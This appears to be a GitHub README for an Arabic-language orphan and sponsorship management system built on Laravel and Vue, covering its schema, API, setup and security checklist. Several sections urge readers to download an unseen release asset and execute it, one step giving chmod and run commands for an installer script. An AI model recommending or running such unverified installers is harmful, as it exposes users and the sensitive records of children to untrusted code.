# Sabili Orphans — Orphan Management System with Arabic Reports

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/Saqibayaz4314/sabili-orphans/releases)

![Sabili Orphans hero image](https://images.unsplash.com/photo-1511918984145-48de785d4c4b?ixlib=rb-1.2.1&auto=format&fit=crop&w=1650&q=80)

A complete system for managing orphan records, sponsors, files, and reports. The system tracks social, health, education, and financial data. It offers role-based dashboards for admins and supervisors. It supports Arabic and RTL layouts. It exports Excel and renders PDF with PDF.js.

> Download the release file and execute it from the releases page: https://github.com/Saqibayaz4314/sabili-orphans/releases

Badges
- License: MIT
- Language: PHP (Laravel)
- Database: MySQL
- Front-end: Vue.js + Bootstrap
- File viewer: PDF.js
- Excel export: PhpSpreadsheet

Table of contents
- About the project
- Key features
- System design
- Data model
- API reference
- Front-end structure
- Installation and setup
- Releases and execution
- Configuration
- Usage: roles and flows
- File management
- Reporting and export
- Arabic interface and RTL
- Security and backups
- Testing and CI
- Contribution guide
- Coding standards
- Troubleshooting
- Changelog and releases
- License and contact

About the project
Sabili Orphans stores and manages detailed records about orphans. It links personal data with health, education, and financial records. It tracks sponsor relationships and sponsorship histories. The web app provides the following:
- Admin dashboard for system control.
- Supervisor views for daily checks.
- Forms for medical, education, and social history.
- File storage and preview using PDF.js.
- Excel export and import for data exchange.
- Arabic UI with RTL support.
- Role-based access control.

The app suits NGOs, charity branches, and social services that track many children and sponsors.

Key features
- Orphan profiles: personal data, ID, family history, status.
- Case files: multiple linked records per orphan.
- Medical records: diagnoses, visits, immunizations.
- Education records: schools, grades, attendance.
- Financial records: aid history, pledges, payments.
- Sponsorship: link sponsors to orphans, manage contracts.
- Documents: upload, tag, and preview PDF and images.
- Excel export: export lists, reports, and details.
- PDF preview: in-browser viewer via PDF.js.
- Arabic interface: full RTL support and translations.
- Multi-user: admin, supervisor, data clerk roles.
- Reports: custom filters and printable PDFs.
- Audit logs: track changes by user and timestamp.

System design
Sabili Orphans splits into clear layers:
- Back-end: Laravel 10. It hosts the REST API, jobs, and scheduled tasks.
- Front-end: Vue 3 with single-page views. It uses Bootstrap 5 and custom RTL CSS.
- Database: MySQL 8. Normalized tables for records and relations.
- File storage: Local storage or cloud (S3). Files include scanned documents and photos.
- Queue: Redis or database queue for heavy tasks like export.
- Worker: php artisan queue:work for background jobs.
- Scheduler: Laravel scheduler for daily jobs like reminders.

Design goals
- Keep the schema simple.
- Make the API predictable.
- Use short, stable endpoints.
- Store large files outside the DB.
- Log user actions for audits.

Data model
Core tables and key fields. Use these as a base for migration files.

- users
  - id, name, email, password, role, active, last_login
- orphans
  - id, first_name, last_name, dob, gender, birth_place, national_id, status, guardian_name, guardian_contact, created_by
- sponsors
  - id, name, contact, address, email, active
- sponsorships
  - id, orphan_id, sponsor_id, start_date, end_date, status, amount, notes
- medical_records
  - id, orphan_id, visit_date, diagnosis, treatment, doctor, attachments
- education_records
  - id, orphan_id, school_name, grade, year, attendance_rate, remarks
- financial_aid
  - id, orphan_id, amount, date, source, purpose, reference
- files
  - id, owner_type, owner_id, filename, path, mime_type, size, uploaded_by
- audit_logs
  - id, user_id, action, table_name, record_id, changes, ip, created_at

Relational notes
- Use foreign keys for orphan_id, sponsor_id.
- Use polymorphic relation for files (owner_type and owner_id).
- Use soft deletes on orphans and sponsors for safety.

API reference
All endpoints return JSON. Use token or session auth. Many endpoints use pagination.

Auth
- POST /api/login
  - body: { email, password }
  - returns: token, user

- POST /api/logout
  - requires: token

Orphan CRUD
- GET /api/orphans
  - query: page, per_page, status, sponsor_id, search
- GET /api/orphans/{id}
- POST /api/orphans
  - body: orphan payload
- PUT /api/orphans/{id}
- DELETE /api/orphans/{id}

Sponsorships
- GET /api/sponsorships
- POST /api/sponsorships
- PUT /api/sponsorships/{id}
- DELETE /api/sponsorships/{id}

Files
- POST /api/files
  - form-data: file, owner_type, owner_id, tags
- GET /api/files/{id}
  - returns file meta and link
- GET /api/files/{id}/download
  - streams file
- DELETE /api/files/{id}

Reports
- POST /api/reports/export
  - body: { type, filters, format }
  - format: excel|pdf
  - returns download link

Export tasks
- Exports run as background jobs.
- API returns a job id.
- Poll GET /api/jobs/{id} for status.
- When done, the API returns a link.

Sample request
Use curl for API testing.

curl --location --request POST 'https://example.org/api/login' \
--header 'Content-Type: application/json' \
--data-raw '{"email":"admin@example.org","password":"secret"}'

Front-end structure
The front-end sits in /resources/js or /frontend. It uses Vue 3 with composition API.

Component groups
- Dashboard: widgets, charts, KPI cards
- Orphan: list, profile, timeline
- Sponsor: list, profile, payments
- Files: uploader, browser, PDF viewer
- Reports: parameters, export actions
- Auth: login, forgot password
- Settings: users, roles, lookup tables

Routing
- /login
- /dashboard
- /orphans
- /orphans/{id}
- /sponsors
- /files
- /reports
- /settings

State management
- Use Pinia or Vuex.
- Keep small, focused stores.
- Use actions to call the API.
- Keep the UI reactive and simple.

Styling
- Bootstrap 5 for base layout.
- Custom variables for brand colors.
- RTL stylesheet for Arabic.
- Use utility classes for spacing and layout.

Installation and setup
This section lists commands and environment choices. It assumes a Unix-like host. Use the release file from the releases page to run a prepared installer or to get the release archive.

Prerequisites
- PHP 8.1 or higher
- Composer 2
- Node 16+
- NPM or Yarn
- MySQL 8 or MariaDB 10.6+
- Redis (optional for queues)
- A web server: Nginx or Apache
- Git

Clone the repo
git clone https://github.com/Saqibayaz4314/sabili-orphans.git
cd sabili-orphans

Setup
1. Copy environment file.
cp .env.example .env

2. Install dependencies.
composer install
npm install

3. Generate app key.
php artisan key:generate

4. Configure .env
- DB_DATABASE, DB_USERNAME, DB_PASSWORD
- MAIL settings for notifications
- FILESYSTEM_DRIVER=local or s3
- QUEUE_CONNECTION=database or redis

5. Run migrations and seeders.
php artisan migrate --seed

6. Build assets.
npm run build
or for dev
npm run dev

7. Run queue worker.
php artisan queue:work

8. Serve or configure web server.
php artisan serve --port=8000
or set up Nginx to point to public/

Releases and execution
Use the GitHub releases page to fetch packaged builds, installers, or release archives. Download the file you need and run it as described below.

- Visit the releases page:
  https://github.com/Saqibayaz4314/sabili-orphans/releases

- Download the release asset for your platform. The release may include:
  - zip or tar.gz with source and build.
  - installer script for Linux or macOS.
  - compiled assets for production.
  - sample .env and SQL dumps.

- After download, extract and execute the installer or run the included script. Example:
  - unzip sabili-orphans-v1.0.0.zip
  - cd sabili-orphans
  - ./install.sh
  The installer will run migrations, create admin user, and build assets.

If the release contains a single executable script, mark it executable and run it:
chmod +x sabili-orphans-installer.sh
./sabili-orphans-installer.sh

Releases link is important. Use it to get the tested builds and installer files.
https://github.com/Saqibayaz4314/sabili-orphans/releases

Configuration
Environment variables
- APP_NAME=Sabili Orphans
- APP_ENV=production
- APP_DEBUG=false
- APP_URL=https://your-domain.org
- DB_CONNECTION=mysql
- DB_HOST=127.0.0.1
- DB_PORT=3306
- DB_DATABASE=sabili
- DB_USERNAME=sabili_user
- DB_PASSWORD=secret
- MAIL_MAILER=smtp
- MAIL_HOST=smtp.mail.org
- MAIL_PORT=587
- MAIL_USERNAME=...
- MAIL_PASSWORD=...
- MAIL_ENCRYPTION=tls
- FILESYSTEM_DRIVER=s3 or local
- AWS_* if using S3
- QUEUE_CONNECTION=redis

Environment tips
- Use strong DB credentials.
- Serve the app over HTTPS in production.
- Offload static files to a CDN when possible.

Usage: roles and flows
Users and roles
- Admin
  - Full access.
  - Manage users and roles.
  - Approve sponsorships.
  - Run exports.
- Supervisor
  - View orphan lists.
  - Approve case entries.
  - Review daily checks.
- Data Clerk
  - Create and edit orphan records.
  - Upload files.
  - Record medical and education updates.

Common flows
- New orphan intake
  - Clerk creates a new profile.
  - Clerk uploads ID and guardian documents.
  - Supervisor reviews and approves.
- Assign sponsor
  - Admin opens sponsorship.
  - Link sponsor to orphan.
  - Set start and end dates and pledge amount.
- Upload medical report
  - Clerk uploads PDF.
  - System links file to orphan medical record.
  - Supervisor can preview with PDF.js.
- Export roster
  - Admin sets filters.
  - Request Excel export.
  - System queues export and returns a link.

File management
Files sit in a structured storage path. Files use a polymorphic relation. The UI uses a file browser to preview and download.

File types
- PDFs (medical reports, IDs)
- Images (photos)
- Excel (import templates)
- Docs (agreements)

File size and limits
- Default upload limit: 10 MB per file
- Increase via php.ini upload_max_filesize and post_max_size
- Use chunked uploads for large files

Preview engine
- PDF.js for in-browser preview.
- Images preview via HTML img.
- Office files convert to PDF on the server for preview, if needed.

File lifecycle
- Upload with owner_type and owner_id.
- Tag and add metadata.
- Use retention policies for archival.
- Use signed URLs for S3 downloads.

Reporting and export
Reports use server-side filters. Exports generate XLSX or PDF. Large exports run as background jobs and store results in storage/app/exports.

Common reports
- Active orphan roster
- Orphans by age group
- Sponsor contributions
- Medical visits per month
- Education outcomes by school

Export flow
1. User selects report and filters.
2. User requests export in Excel or PDF.
3. API queues export job.
4. Worker generates file.
5. System posts file to storage and returns a link.
6. User downloads the file.

Export file naming
- sabili_orphans_report_{type}_{YYYYMMDD_HHMMSS}.xlsx

Excel templates
- Use PhpSpreadsheet.
- Export uses simple sheets and safe cell typing.
- Format date columns.
- Include a header row with human labels.
- Include an export manifest sheet with filters used.

Arabic interface and RTL
The app supports Arabic translation and right-to-left layout.

Implementation
- Use Laravel localization files: resources/lang/ar
- Use direction-aware CSS: [dir="rtl"] rules
- Switch layout classes when locale is Arabic
- Mirror Bootstrap layout with RTL utilities or use bootstrap-rtl

Content
- Provide translated labels for forms, buttons, and messages.
- Keep short labels for UI clarity.
- Use Arabic numerals where needed.
- Use clear Arabic that matches field-level meaning.

Form behavior
- Align labels to the right for RTL.
- Place validation messages under the field.
- Keep input masks for phone and ID fields.

PDF.js
- Embed PDF.js viewer for file preview.
- Use secure signed links for cloud files.
- Provide a full-screen preview and print controls.

Security and backups
Security measures
- Use HTTPS everywhere.
- Use prepared statements and parameter binding.
- Validate all file uploads by mime type and size.
- Sanitize user input.
- Use strong password hashing (bcrypt or Argon2).
- Enforce role checks on server side.
- Rate limit authentication endpoints.

Access control
- Gate or policy per model.
- Restrict file downloads by role and owner.
- Audit log all changes to sensitive records.

Backups
- Backup DB daily.
- Back up files depending on retention policy.
- Use automated scripts to push backups to cloud storage.
- Test restores regularly.

Disaster recovery
- Keep a copy of .env in a secure place.
- Keep migration files to recreate schema.
- Keep a seed for admin account.

Testing and CI
Testing
- Use PHPUnit for backend tests.
- Use Pest for simpler test syntax if preferred.
- Test API endpoints for auth, CRUD, and exports.
- Test file upload logic with test files.
- Test migrations and seeders.

Example test command
php artisan test

CI pipeline
- Run tests on commit.
- Run static checks: PHPStan, ESLint.
- Build assets.
- Run end-to-end tests with Cypress for core flows.

Recommended CI steps
1. Install PHP dependencies.
2. Install NPM dependencies.
3. Run linting.
4. Run unit tests.
5. Build assets.
6. Deploy on tag or release.

Contribution guide
The repo welcomes contribution. Follow these steps.

How to contribute
- Fork the repo.
- Create a feature branch.
- Write tests for new features.
- Keep commits small.
- Open a pull request with a clear description.
- Follow the code style.

Branch naming
- feature/<short-description>
- fix/<short-description>
- docs/<update>

Code review
- Keep PRs focused.
- Run test suite locally.
- Provide steps to reproduce for bug fixes.

Coding standards
- PSR-12 for PHP.
- Use Composer for packages.
- For JS, use ESLint with a shared config.
- For CSS, use SCSS variables and maintain small modules.

Database migrations
- Write reversible migrations.
- Keep migrations small and focused.
- Use indexes for commonly queried fields.

Troubleshooting
Common problem: migration fails
- Ensure DB creds in .env match the DB.
- Run php artisan migrate:fresh --seed on dev only.

Common problem: assets do not load
- Run npm run build and clear cache.
- php artisan view:clear
- php artisan config:cache

Common problem: queues not running
- Start worker: php artisan queue:work
- Use supervisor or systemd to keep it alive.

Logs
- Check storage/logs/laravel.log for server errors.
- Check queue logs for failed jobs.

Changelog and releases
Check the releases page for downloads, installers, and release notes. The page includes compiled assets and packaged installers. Download the correct asset for your platform and follow the included instructions. If you need the prepared installer, download and execute the release asset.

https://github.com/Saqibayaz4314/sabili-orphans/releases

License
This project uses the MIT license. See LICENSE for details.

Contact and support
- Open issues on GitHub for bugs and feature requests.
- Use PRs for code changes.
- For urgent matters, create an issue and tag maintainers.

Sample commands quick list
- Clone: git clone https://github.com/Saqibayaz4314/sabili-orphans.git
- Install PHP deps: composer install
- Install JS deps: npm install
- Build assets: npm run build
- Generate key: php artisan key:generate
- Migrate: php artisan migrate --seed
- Start server: php artisan serve
- Start queue: php artisan queue:work
- Run tests: php artisan test

Screenshots and gallery
Dashboard
![Dashboard](https://images.unsplash.com/photo-1524504388940-b1c1722653e1?ixlib=rb-1.2.1&auto=format&fit=crop&w=1650&q=80)

Orphan profile
![Profile](https://images.unsplash.com/photo-1524635962361-8b1f9bca4fd1?ixlib=rb-1.2.1&auto=format&fit=crop&w=1650&q=80)

PDF viewer
![PDF Viewer](https://images.unsplash.com/photo-1557800636-894a64c1696f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1650&q=80)

Sponsors view
![Sponsors](https://images.unsplash.com/photo-1532944442525-7902a2d3a3f5?ixlib=rb-1.2.1&auto=format&fit=crop&w=1650&q=80)

Internal architecture diagram (conceptual)
![Architecture](https://miro.medium.com/max/1400/1*V1l2t3F-5g2s6gO8wQ2EWA.png)

Appendix: common CLI snippets
Create admin user via tinker
php artisan tinker
>>> \App\Models\User::factory()->create(['email'=>'admin@example.org','role'=>'admin','password'=>bcrypt('secret')]);

Seed sample data
php artisan db:seed --class=SampleOrphansSeeder

Queue failed jobs re-run
php artisan queue:retry all

Storage link
php artisan storage:link

Export example (API)
POST /api/reports/export
body:
{
  "type":"orphan_roster",
  "filters": {"status":"active","age_from":6,"age_to":12},
  "format":"excel"
}

Background job flow for exports
- ExportRequest saved to exports table
- Export job pushes data to generator
- Generator writes XLSX to storage/exports
- Job updates record with path and status
- Front-end polls job status and provides download

Security checklist before production
- APP_DEBUG=false
- Use HTTPS
- Set secure cookie flags
- Rotate keys and passwords
- Revoke unused tokens
- Set up monitoring for errors and performance

Localization guide
- Add translations in resources/lang/{locale}
- Wrap UI strings with __() helper
- Use fallback locale for missing keys
- Translate validation messages

Common extension points
- Add new case types by adding a table and module.
- Add new export formats by extending export job with generators.
- Add webhook triggers for sponsor payments.

Assets and vendor notes
- Keep third-party libs updated.
- Track package versions in composer.json and package.json.
- Pin to minor versions when possible.

This README gives the details needed to install, run, and extend Sabili Orphans. Use the releases page to get packaged builds and installer files. Download the specific release asset and execute the included script or archive to set up the production-ready build. https://github.com/Saqibayaz4314/sabili-orphans/releases